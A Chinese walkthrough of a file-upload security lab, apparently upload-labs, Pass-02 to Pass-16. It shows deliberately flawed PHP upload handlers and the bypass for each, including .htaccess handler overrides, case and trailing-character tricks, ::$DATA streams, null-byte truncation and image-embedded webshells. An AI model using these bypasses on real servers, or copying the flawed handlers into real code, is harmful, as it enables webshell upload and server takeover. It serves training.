<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &apos;上传出错！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;文件类型不正确，请重新上传！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>拦截方式：对文件的MIME(Multipurpose Internet Mail Extensions)进行了验证，只允许图片类的MIME类型通过</p>
</li>
<li><p>绕过方式：直接上传木马文件，burp截包，修改Content-Type为image/gif，go….</p>
<blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/9223646-35b684b78a4b9b44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
</blockquote>
</li>
</ul>
<p>####0x03 Pass-03</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &apos;上传出错！&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>拦截方式：黑名单验证(‘.asp’,’.aspx’,’.php’,’.jsp’)</p>
</li>
<li><p>绕过方式：<br>(1)可上传php3,php5…等这样可以被服务器解析的后缀名<br>(2)重写文件解析规则绕过，先上传一个.htaccess文件，再上传一个1.jpg文件(内含木马)<br>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，<br>无论扩展名是什么(没有也行)，都以php的方式来解析<br>.htaccess文件内容：</p>
<figure class="highlight plain"><figcaption><span>"1.jpg">```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">####0x04 Pass-04</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //收尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件不允许上传!&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：对上传文件的后缀名的判断种类增加</span><br><span class="line"></span><br><span class="line">* 绕过方式：重写文件解析规则绕过(第3关(2))</span><br><span class="line"></span><br><span class="line">####0x05 Pass-05</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：.htaccess加入了黑名单，取消了后缀名全变为小写字母的函数</span><br><span class="line"></span><br><span class="line">* 绕过方式：采用大小写混合方式绕过.Php,.PHp5...</span><br><span class="line">####0x06 Pass-06</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = $_FILES[‘upload_file’][‘name’];<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file,$img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件不允许上传&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 题目没有去除文件尾部的空格, 所以使用 burpsuite 抓包文件名添加空格即可绕过.</span><br><span class="line">####0x07 Pass-07</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：.htaccess加入了黑名单，后缀名全变为小写字母的函数依旧存在</span><br><span class="line"></span><br><span class="line">* 绕过方式：利用windows系统的文件名特性</span><br><span class="line">(不允许有.单独存在),上传1.php，burp截包,将后缀改为1.php .的形式，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php</span><br><span class="line">####0x08 Pass-08</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：缺少 ```$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>

<ul>
<li>绕过方式：利用windows文件流特性绕过，1.php上传,burp截包,改为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">####0x09 Pass-09</span><br></pre></td></tr></table></figure></li>
</ul>
<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &apos;上传出错！&apos;;
        }
    } else {
        $msg = &apos;此文件类型不允许上传！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 本题中的代码后缀名处理的不够严谨, 先去除了文件后面的., 再去除了文件后缀的空格, 由于只处理了一次, 所以可以通过上传1.php. . 原理跟前面几题基本一样.</span><br><span class="line">####0x10 Pass-10</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“php”,”php5”,”php4”,”php3”,”php2”,”html”,”htm”,”phtml”,”pht”,”jsp”,”jspa”,”jspx”,”jsw”,”jsv”,”jspf”,”jtml”,”asp”,”aspx”,”asa”,”asax”,”ascx”,”ashx”,”asmx”,”cer”,”swf”,”htaccess”);</p>
<pre><code>    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;        
    if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
    } else {
        $msg = &apos;上传出错！&apos;;
    }
} else {
    $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：``` $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);```, 作用是把黑名单里面的后缀名替换成空, 由于只替换了一遍, 只对文件名进行了一次过滤，所以可以采用双写绕过。</span><br><span class="line"></span><br><span class="line">* 绕过方式：构造双重文件名,1.phphpp</span><br><span class="line">####0x11 Pass-11</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $ext_arr = array(‘jpg’,’png’,’gif’);<br>    $file_ext = substr($_FILES[‘upload_file’][‘name’],strrpos($_FILES[‘upload_file’][‘name’],”.”)+1);<br>    if(in_array($file_ext,$ext_arr)){<br>        $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>        $img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p>
<pre><code>    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = &apos;上传出错！&apos;;
    }
} else{
    $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：以时间戳方式对上传文件进行命名</span><br><span class="line"></span><br><span class="line">* 绕过方式：使用上传路径名%00截断绕过，不过这需要对文件有足够的权限，比如说创建</span><br><span class="line">文件夹，上传的文件名写成1.jpg, save_path改成../upload/1.php%00，最后保存下来的文件就是1.php</span><br><span class="line">//某些情况下可以使用 %00 截断</span><br><span class="line">1、PHP 版本 &lt; 5.3.4</span><br><span class="line">2、php.ini 中 magic_quotes_gpc=off</span><br><span class="line">####0x12 Pass-12</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $ext_arr = array(‘jpg’,’png’,’gif’);<br>    $file_ext = substr($_FILES[‘upload_file’][‘name’],strrpos($_FILES[‘upload_file’][‘name’],”.”)+1);<br>    if(in_array($file_ext,$ext_arr)){<br>        $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>        $img_path = $_POST[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p>
<pre><code>    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = &quot;上传失败&quot;;
    }
} else {
    $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 原理与11相同，```$img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;save_path``` 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.</span><br><span class="line">这里把 2b(&apos;+&apos;的 hex) 修改成 00</span><br><span class="line">####0x13 Pass-13</span><br></pre></td></tr></table></figure>

<p>function getReailFileType($filename){<br>    $file = fopen($filename, “rb”);<br>    $bin = fread($file, 2); //只读2字节<br>    fclose($file);<br>    $strInfo = @unpack(“C2chars”, $bin);<br>    $typeCode = intval($strInfo[‘chars1’].$strInfo[‘chars2’]);<br>    $fileType = ‘’;<br>    switch($typeCode){<br>        case 255216:<br>            $fileType = ‘jpg’;<br>            break;<br>        case 13780:<br>            $fileType = ‘png’;<br>            break;<br>        case 7173:<br>            $fileType = ‘gif’;<br>            break;<br>        default:<br>            $fileType = ‘unknown’;<br>        }<br>        return $fileType;<br>}</p>
<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $file_type = getReailFileType($temp_file);</p>
<pre><code>if($file_type == &apos;unknown&apos;){
    $msg = &quot;文件未知，上传失败！&quot;;
}else{
    $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
    if(move_uploaded_file($temp_file,$img_path)){
        $is_upload = true;
    } else {
        $msg = &quot;上传出错！&quot;;
    }
}</code></pre><p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：1、保证上传后的图片马中仍然包含完整的一句话或webshell代码。2.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！</span><br><span class="line"></span><br><span class="line">* 绕过方式：</span><br><span class="line">(1)只读文件的前两个字节，在文件的开端添加gif的标志文件头GIF89a，可进行绕过;</span><br><span class="line">(2)使用命令```copy 1.jpg /b + shell.php /a webshell.jpg```将一句话木马添加到图片中也可(但是我们没有办法拿到shell，应为我们上传的图片马无法被解析成php形式，通常图片马配合%00或者0x00截断上传，或者配合解析漏洞)</span><br><span class="line">####0x14 Pass-14</span><br></pre></td></tr></table></figure>

<p>function isImage($filename){<br>    $types = ‘.jpeg|.png|.gif’;<br>    if(file_exists($filename)){<br>        $info = getimagesize($filename);<br>        $ext = image_type_to_extension($info[2]);<br>        if(stripos($types,$ext)){<br>            return $ext;<br>        }else{<br>            return false;<br>        }<br>    }else{<br>        return false;<br>    }<br>}</p>
<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $res = isImage($temp_file);<br>    if(!$res){<br>        $msg = “文件未知，上传失败！”;<br>    }else{<br>        $img_path = UPLOAD_PATH.”/“.rand(10, 99).date(“YmdHis”).$res;<br>        if(move_uploaded_file($temp_file,$img_path)){<br>            $is_upload = true;<br>        } else {<br>            $msg = “上传出错！”;<br>        }<br>    }<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 拦截方式：</span><br><span class="line">(1)[getimagesize() 函数](https://blog.csdn.net/sanbingyutuoniao123/article/details/52166617)用于获取图像尺寸，给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</span><br><span class="line">(2)image_type_to_extension() 函数用于获取图片后缀</span><br><span class="line">* 绕过方式：同 13</span><br><span class="line"></span><br><span class="line">####0x15 Pass-15</span><br></pre></td></tr></table></figure>

<p>function isImage($filename){<br>    //需要开启php_exif模块<br>    $image_type = exif_imagetype($filename);<br>    switch ($image_type) {<br>        case IMAGETYPE_GIF:<br>            return “gif”;<br>            break;<br>        case IMAGETYPE_JPEG:<br>            return “jpg”;<br>            break;<br>        case IMAGETYPE_PNG:<br>            return “png”;<br>            break;<br>        default:<br>            return false;<br>            break;<br>    }<br>}</p>
<p>$is_upload = false;<br>$msg = null;<br>if(isset($_POST[‘submit’])){<br>    $temp_file = $_FILES[‘upload_file’][‘tmp_name’];<br>    $res = isImage($temp_file);<br>    if(!$res){<br>        $msg = “文件未知，上传失败！”;<br>    }else{<br>        $img_path = UPLOAD_PATH.”/“.rand(10, 99).date(“YmdHis”).”.”.$res;<br>        if(move_uploaded_file($temp_file,$img_path)){<br>            $is_upload = true;<br>        } else {<br>            $msg = “上传出错！”;<br>        }<br>    }<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 拦截方式：exif_imagetype的作用也是根据文件头判断文件类型, 所以一样可以使用图片马绕过.</span><br><span class="line"></span><br><span class="line">* 绕过方式：同13</span><br><span class="line">####0x16 Pass-16</span><br></pre></td></tr></table></figure>

<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])){<br>    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径<br>    $filename = $_FILES[‘upload_file’][‘name’];<br>    $filetype = $_FILES[‘upload_file’][‘type’];<br>    $tmpname = $_FILES[‘upload_file’][‘tmp_name’];</p>
<pre><code>$target_path=UPLOAD_PATH.basename($filename);

// 获得上传文件的扩展名
$fileext= substr(strrchr($filename,&quot;.&quot;),1);

//判断文件后缀与类型，合法才进行上传操作
if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
    if(move_uploaded_file($tmpname,$target_path))
    {
        //使用上传的图片生成新的图片
        $im = imagecreatefromjpeg($target_path);

        if($im == false){
            $msg = &quot;该文件不是jpg格式的图片！&quot;;
            @unlink($target_path);
        }else{
            //给新图片指定文件名
            srand(time());
            $newfilename = strval(rand()).&quot;.jpg&quot;;
            $newimagepath = UPLOAD_PATH.$newfilename;
            imagejpeg($im,$newimagepath);
            //显示二次渲染后的图片（使用用户上传图片生成的新图片）
            $img_path = UPLOAD_PATH.$newfilename;
            @unlink($target_path);
            $is_upload = true;
        }
    } else {
        $msg = &quot;上传出错！&quot;;
    }

}else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
    if(move_uploaded_file($tmpname,$target_path))
    {
        //使用上传的图片生成新的图片
